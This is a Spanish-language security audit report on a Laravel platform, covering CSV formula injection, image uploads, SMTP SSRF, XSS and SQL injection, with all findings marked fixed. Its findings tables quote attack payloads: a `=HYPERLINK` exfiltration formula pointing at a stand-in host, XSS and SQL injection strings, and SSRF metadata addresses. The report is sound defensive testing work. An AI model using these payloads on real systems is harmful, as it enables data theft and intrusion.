# Auditoría de seguridad 2026-10-06 — Inyección, XSS y manejo de archivos

Rama: `feature/seg-inyeccion` (sobre `feature/seguridad-base`). Pruebas de regresión: `tests/Feature/SeguridadAuditoria/InyeccionTest.php` e `InyeccionNovedadesTest.php`.

## Resumen para el dueño del proyecto

Intentamos "romper" la plataforma metiendo código malicioso en todos los campos de texto, en las búsquedas, en las imágenes que se suben y en las exportaciones a Excel.

- **Lo importante:** no encontramos ninguna forma de robar datos de otra empresa ni de ejecutar código en el servidor. Las pantallas ya escapaban bien todo lo que escribe el usuario: probamos más de 200 campos con código malicioso, en 500 pantallas, y ninguno se ejecutó.
- **Lo que sí corregimos:**
  1. **Exportaciones a Excel (Media).** Si alguien capturaba un texto como `=HYPERLINK(...)`, al abrir el CSV en Excel se convertía en una fórmula. Podía servir para engañar a quien abre el archivo y sacar datos. Ahora esas celdas se guardan como texto.
  2. **Imágenes subidas (Baja).** Los logos y las firmas se guardaban tal como llegaban. Ahora se vuelven a dibujar, y cualquier código escondido dentro de la imagen se pierde.
  3. **Correo de la plataforma (Baja).** La pantalla del correo aceptaba cualquier puerto. Eso permitía usarla para "tocar" otros servicios internos. Ahora solo acepta puertos de correo.
  4. **Detalles menores (Baja/Informativa).**
     - Errores 500 cuando alguien manipula la dirección de la pantalla.
     - Una ruta interna de archivos que no se usaba.
     - Un enlace externo de Lost & Found.
     - Un filtro de la bitácora.
- **Nada quedó pendiente de esta área.**

## Hallazgos

| ID | Severidad | Qué se probó | Evidencia | Corrección | Estado |
|---|---|---|---|---|---|
| INY-01 | Media | Inyección de fórmulas (CSV/Excel, CWE-1236) en las 7 exportaciones: Accesos, Auditoría, Llaves, Préstamo de llaves, Novedades, Recorridos PC y Transporte. Se probaron textos que empiezan con `=`, `+`, `-`, `@`, tabulador o retorno. | `test_iny01_*` (fallaban antes del cambio). PoC: una llave con descripción `=HYPERLINK("http://sitio-malo/?d="&A2,"Clic aquí")` salía tal cual en `/llaves/exportar`. Lo mismo un nombre de usuario `@SUM(...)` en `/auditoria/exportar`. | `App\Support\Csv::fila()` reemplaza a `fputcsv` en todas las exportaciones. Antepone `'` a las celdas peligrosas y deja intactos los números (`-12`). | Corregido |
| INY-02 | Baja | Subida de imágenes: símbolo e ícono de Identidad, logo de empresa (también lo cambia el administrador de la empresa) y firmas (data URL). Se probó un PNG o JPEG "políglota" con `<script>` y `<?php` pegados, nombres `simbolo.php.png` y `logo.html`, SVG o HTML disfrazados de PNG, y un GIF con encabezado PNG. | `test_iny02_*`. Antes, el archivo guardado en `public/storage` conservaba el `<script>`/`<?php`. El tipo real ya se validaba, así que el SVG, el HTML y el GIF ya se rechazaban. | `App\Support\ImagenSegura` re-dibuja la imagen con GD y guarda la copia limpia con nombre aleatorio y extensión según el tipo real. También quita metadatos EXIF. `Firmas::guardar()` usa lo mismo. `desplegar.sh` crea `.htaccess` en `storage/app/public` (→ `public/storage`): niega scripts, HTML, SVG y JS, y envía `nosniff` y CSP `sandbox`. | Corregido |
| INY-03 | Baja | SSRF por la configuración SMTP (solo Super Administrador): puertos arbitrarios (22, 3306, 6379…) y servidores `169.254.169.254`, `0.0.0.0`, multicast, `::ffff:169.254.169.254`, `fe80::1` o decimal `2852039166`. El mensaje de error mostraba la respuesta del servicio, como un escáner de puertos. | `test_iny03_*` (antes aceptaba el puerto 6379). | Solo puertos 25, 465, 587 y 2525. Se rechazan direcciones reservadas (también si el nombre resuelve a ellas). Se revisa al guardar y antes de cada envío (`CorreoPlataforma::problemaDestino`). Los servidores privados y locales siguen permitidos (relevo interno o `localhost` de cPanel). | Corregido |
| INY-04 | Baja | Ruta `GET /storage/{path}` que Laravel registra para el disco privado `local` (`serve => true`). Ahí viven los respaldos de la base y las firmas. Solo la protegía una firma con la `APP_KEY`: si la clave se filtrara, se podrían descargar los respaldos. La aplicación no la usa. | `test_iny04_el_disco_privado_no_publica_la_ruta_storage`. | `config/filesystems.php`: `serve => false`. | Corregido |
| INY-05 | Baja | Parámetros de texto enviados como arreglo (`?q[]=x`, `q[a][b]=x`, `nombre[]=x`). Se probaron 50 nombres de parámetro en todas las pantallas GET. | Fuzzing en vivo: 28 respuestas 500 ("Array to string conversion") en buscadores de colaboradores, personas, proveedores y vehículos, en Transporte (lista, reportes, exportar) y en Vouchers. Además `?abrir[]=` en Novedades y Robos, `rfc[]`/`codigo[]` en altas y `nombre[]` en Departamentos, Puestos y Turnos. `test_iny05_*`. | `App\Support\Entrada::texto()`: lo que no es texto simple se trata como vacío. Se aplicó en las 31 lecturas que convertían la entrada con `(string)` o la pasaban a funciones `?string`. | Corregido |
| INY-06 | Informativa | Redirección al cambiar de empresa activa (`POST /empresa-activa`), con Referer `/\sitio-malo`, `https://sitio-malo` y `//sitio-malo`. | `test_iny06_*`. Con `/\…` Laravel redirigía a `http://<mismo-host>/\sitio-malo…`: no es explotable, porque el Referer lo pone el navegador y la URL queda en el mismo dominio. | Endurecido: se rechaza cualquier `\` en el destino relativo. | Corregido |
| INY-07 | Informativa | Filtro "módulo" de la bitácora de auditoría: `LIKE 'modulo.%'` sin escapar `_`. Con `prestamo_llaves`, también salían eventos `prestamoXllaves.*` (siempre de la misma empresa). | `test_iny07_*`. | Comparación exacta del prefijo `modulo.` con `SUBSTR(evento, 1, n) = ?` (con bindings). | Corregido |
| INY-08 | Baja | Enlace externo de Lost & Found (`lf_enlace_externo`), con `javascript:` en datos heredados (p. ej. migrados de SEGCAT) y al regresar el formulario con errores (self-XSS: el usuario tendría que dar clic en su propio enlace). | `test_iny08_*` (fallaba antes del cambio). | La vista solo pinta el botón "Abrir en la otra plataforma" si el enlace empieza con `http://` o `https://`. | Corregido |

## Revisado, sin hallazgo

| Tema | Qué se revisó / probó | Resultado |
|---|---|---|
| Inyección SQL | Todos los `whereRaw`, `orWhereRaw`, `selectRaw`, `orderByRaw`, `DB::raw`, `DB::select` y `DB::statement` de `app/`. | Usan bindings (`?`) o SQL fijo. Los `LIKE` con texto del usuario escapan `% _ \`. Ninguna columna ni orden se toma de la petición. No hay rutas JSON (`col->campo`) con datos del usuario. `Respaldos` usa nombres de tabla del propio esquema con backticks escapados. Fuzzing con `' OR '1'='1`, `1) OR (1=1`, `%`, `_`, `\` y bytes nulos en todas las pantallas: sin errores ni resultados de más. |
| XSS almacenado y reflejado | Se puso la carga `<img src=x onerror=alert(1)>"><svg/onload=alert(2)>'{{7*7}}` en las columnas de texto libre de 55 tablas. También en Identidad (nombre, eslogan, titular, colores), en el correo SMTP y en la lista de avisos. Rastreo automático de 503 URLs como administrador y 163 como Super Administrador. | 0 cargas sin escapar en HTML. Las encontradas estaban en respuestas JSON (correcto: el navegador las pinta con `textContent`) y en CSV (cubierto en INY-01). |
| XSS en el navegador (DOM) | Revisión de los 19 `innerHTML`/`insertAdjacentHTML` y de los `href` dinámicos de `public/js/plataforma.js`. Playwright en 33 pantallas: escribe en buscadores y lectores, y abre diálogos y detalles con datos envenenados. | Los `innerHTML` solo reciben plantillas del servidor (`<template>`, con índices numéricos) o fragmentos ya escapados por Blade. Los datos JSON se insertan con `textContent` y `createTextNode`. 0 `alert()` disparados. |
| `{!! !!}` en Blade | 30 usos. | Son `nl2br(e(...))`, SVG de QR generado en el servidor o HTML fijo (`$extra` en Espacios). `@json` dentro de `<script type="application/json">` usa `JSON_HEX_TAG`. |
| Inyección CSS (colores de Identidad) | `red;}</style><script>…`, `#000;background:url(//x)` guardados directo en la base. | Se validan como `#RRGGBB` al guardar y al leer. Si no cumplen, se usa el color por defecto (prueba `test_xss_almacenado_en_llaves_y_colores_de_identidad_se_escapa`). |
| Plantillas de correo y encabezados | Vistas `resources/views/correos/*`. Nombre de colaborador con `\r\nBcc:` en el asunto. | Las vistas solo usan `{{ }}`. Symfony Mailer codifica el asunto y no se crea el encabezado Bcc (prueba `test_un_nombre_con_saltos_de_linea_no_inyecta_encabezados_en_el_correo`). |
| Path traversal en descargas | `/configuracion/respaldos/{archivo}`, firmas (5 controladores) y archivos de Identidad y logo. | Respaldos: patrón estricto en la ruta y en el servicio. Firmas: rutas generadas en el servidor, prefijo `firmas/<empresa>/` y sin `..`. No hay descargas con nombres que escriba el usuario. |
| Redirecciones abiertas | `url.intended` del login, `/e/{codigo}`, `volver`/`_volver`, `#ancla`. | El login solo acepta el mismo host y `http(s)`. `/e/{codigo}` redirige a URLs creadas con `route()`. `volver` se compara contra valores fijos. |
| Deserialización y ejecución dinámica | `unserialize`, `eval`, `extract`, `include` y `require` con variables, XML y `Blade::render`. | No se usan. |
| Asignación masiva | `$request->all()` pasado a 33 servicios. | Cada servicio valida y arma arreglos con claves explícitas. `validate()` devuelve solo lo validado. |
| Regex DoS | Expresiones de validación (RFC, placas, colores, teléfonos, códigos, respaldos) y limpiezas con `preg_replace`. | Todas ancladas, sin cuantificadores anidados ni alternancias ambiguas: tiempo lineal. |
| SVG subido por el usuario | Identidad y logo de empresa. | SVG prohibido. Un SVG o HTML renombrado a `.png` se rechaza por su contenido real (prueba `test_iny02_svg_o_html_disfrazados_de_png_se_rechazan`). |

## Notas para otras áreas

- **Infraestructura:**
  - `desplegar.sh` ahora escribe `storage/app/public/.htaccess`. Si `seg-infraestructura` agrega encabezados globales (`nosniff`, CSP) en `public/.htaccess`, este archivo los complementa para `public/storage`.
  - `Require all denied` necesita `AllowOverride AuthConfig` (en cPanel suele estar `All`). Si Neubox no lo permitiera, Apache respondería 500 en las imágenes. Revisar una imagen después del primer despliegue.
- **Pruebas en SQLite:** SQLite no usa `\` como escape en `LIKE` sin cláusula `ESCAPE`. En producción (MySQL) el escape funciona. En pruebas, buscar un texto con `%` o `_` puede no encontrar coincidencias. Es solo una diferencia de ambiente, no de seguridad.
